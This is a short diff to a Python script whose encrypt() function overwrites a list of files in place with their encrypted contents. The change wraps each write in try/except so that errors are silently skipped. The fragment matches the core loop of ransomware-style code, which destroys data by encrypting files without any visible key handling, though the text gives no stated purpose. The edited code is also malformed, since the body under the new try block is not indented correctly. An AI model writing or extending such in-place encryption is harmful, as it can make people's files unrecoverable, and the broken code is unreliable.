@@ -20,9 +20,12 @@ def encrypt():
     for item in files:
         with open(item, "rb") as i:
             oldContent = i.read()
-        with open(item, "wb") as e:
+        try:
+            with open(item, "wb") as e:
             newContent = cipher.encrypt(oldContent)
             e.write(newContent)
+        except Exception:
+            continue
 
 if __name__ == "__main__":
     encrypt()
